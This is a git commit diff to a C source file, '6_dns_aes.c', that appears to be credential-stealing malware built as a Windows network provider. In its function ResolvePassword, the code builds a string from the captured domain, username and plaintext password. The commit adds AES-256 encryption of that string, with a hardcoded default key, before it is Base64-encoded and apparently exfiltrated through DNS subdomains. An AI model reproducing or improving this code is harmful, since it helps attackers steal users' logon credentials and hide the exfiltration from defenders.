a5cf3d5631e7575fbaef591a245425b94c072fde
Ricardo Ruiz <ricardojruiz93@gmail.com>
2025-04-16 11:19:19 +0200

    Add files via upload

--- 6_dns_aes.c
+++ 6_dns_aes.c
@@ -10,6 +10,9 @@
 #define WNNC_NET_TYPE                    0x00000002
 #define WNNC_START                       0x0000000C
 #define WNNC_WAIT_FOR_START              0x00000001
+#ifndef AES_PWD
+#define AES_PWD "TEST1234"
+#endif
 
 typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
 typedef enum _MSV1_0_LOGON_SUBMIT_TYPE { MsV1_0InteractiveLogon = 2, MsV1_0Lm20Logon, MsV1_0NetworkLogon, MsV1_0SubAuthLogon, MsV1_0WorkstationUnlockLogon = 7, MsV1_0S4ULogon = 12, MsV1_0VirtualLogon = 82, MsV1_0NoElevationLogon = 83, MsV1_0LuidLogon = 84, } MSV1_0_LOGON_SUBMIT_TYPE, *PMSV1_0_LOGON_SUBMIT_TYPE;
@@ -222,10 +225,73 @@ void test(LPWSTR logString, LPWSTR subdomain){
 }
 
 
+LPWSTR EncryptWithAES(LPWSTR input, LPCSTR password)
+{
+    if (!input) return NULL;
+    int inputLen = WideCharToMultiByte(CP_UTF8, 0, input, -1, NULL, 0, NULL, NULL);
+    if (inputLen == 0) return NULL;
+
+    BYTE* utf8Data = (BYTE*)LocalAlloc(LMEM_ZEROINIT, inputLen);
+    if (!utf8Data) return NULL;
+
+    WideCharToMultiByte(CP_UTF8, 0, input, -1, (LPSTR)utf8Data, inputLen, NULL, NULL);
+
+    HCRYPTPROV hProv = 0;
+    HCRYPTHASH hHash = 0;
+    HCRYPTKEY hKey = 0;
+    BYTE* encryptedData = NULL;
+    DWORD dataLen = inputLen;
+
+    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+        goto cleanup;
+    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
+        goto cleanup;
+    if (!CryptHashData(hHash, (BYTE*)password, (DWORD)strlen(password), 0))
+        goto cleanup;
+    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))
+        goto cleanup;
+    encryptedData = (BYTE*)LocalAlloc(LMEM_ZEROINIT, dataLen + 16); // espacio extra
+    if (!encryptedData) goto cleanup;
+    memcpy(encryptedData, utf8Data, dataLen);
+
+    if (!CryptEncrypt(hKey, 0, TRUE, 0, encryptedData, &dataLen, dataLen + 16))
+        goto cleanup;
+
+    DWORD base64Len = 0;
+    CryptBinaryToStringA(encryptedData, dataLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
+    CHAR* base64A = (CHAR*)LocalAlloc(LMEM_ZEROINIT, base64Len);
+    CryptBinaryToStringA(encryptedData, dataLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64A, &base64Len);
+
+    int base64WLen = MultiByteToWideChar(CP_ACP, 0, base64A, -1, NULL, 0);
+    LPWSTR base64W = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, base64WLen * sizeof(WCHAR));
+    MultiByteToWideChar(CP_ACP, 0, base64A, -1, base64W, base64WLen);
+
+    LocalFree(utf8Data);
+    LocalFree(encryptedData);
+    LocalFree(base64A);
+    if (hKey) CryptDestroyKey(hKey);
+    if (hHash) CryptDestroyHash(hHash);
+    if (hProv) CryptReleaseContext(hProv, 0);
+
+    return base64W;
+
+cleanup:
+    if (utf8Data) LocalFree(utf8Data);
+    if (encryptedData) LocalFree(encryptedData);
+    //if (base64A) LocalFree(base64A);
+    if (hKey) CryptDestroyKey(hKey);
+    if (hHash) CryptDestroyHash(hHash);
+    if (hProv) CryptReleaseContext(hProv, 0);
+    return NULL;
+}
+
+
 void ResolvePassword(PWCHAR operation, PUNICODE_STRING domain, PUNICODE_STRING username, PUNICODE_STRING password)
 {
+    LPCSTR aes_password = AES_PWD;
     LPWSTR timestamp = GetCurrentTimestamp();
     LPWSTR logString = BuildLogString(operation, domain, username, password, timestamp);
+    logString = EncryptWithAES(logString, aes_password);
     logString = LPWSTRToBase64UTF8(logString);
 
     #ifdef SUBDOMAIN
